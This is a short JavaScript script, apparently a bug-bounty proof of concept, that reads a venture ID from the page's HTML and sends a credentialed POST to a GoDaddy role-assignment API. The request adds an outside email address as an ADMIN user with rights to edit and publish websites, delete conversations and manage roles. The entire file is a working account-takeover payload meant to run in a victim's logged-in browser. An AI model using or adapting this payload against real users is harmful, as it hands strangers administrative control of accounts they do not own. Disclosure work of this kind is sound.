const EMAIL = "inimail+2@wearehackerone.com";

function processAndAddUser() {
    try {
        const html = document.documentElement.innerHTML;

        const match = html.match(/ventureId["']?\s*:\s*["']?([^"',}\s]+)/i);
        const resourceId = match ? match[1] : null;

        console.log("ventureId:", resourceId);

        if (!resourceId) {
            throw new Error("ventureId not found — aborting request");
        }

        const xhr = new XMLHttpRequest();
        xhr.open("POST", "https://api.godaddy.com/v2/roles/assignees", false);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.withCredentials = true;

        const payload = {
            permissionsToInclude: [
                "conversation_manage_settings",
                "conversation_reply",
                "conversation_delete",
                "package_view_and_manage_roles_users",
                "website_edit",
                "website_publish"
            ],
            userName: "testingsss",
            userEmail: EMAIL,
            resourceId: resourceId,
            resourceType: "venture",
            defaultRole: "ADMIN"
        };

        xhr.send(JSON.stringify(payload));

        if (xhr.status !== 200 && xhr.status !== 201) {
            throw new Error(`Failed to add user: ${xhr.statusText}`);
        }

        console.log("User added successfully.");
    } catch (error) {
        console.error("An error occurred:", error.message);
    }
}

processAndAddUser();
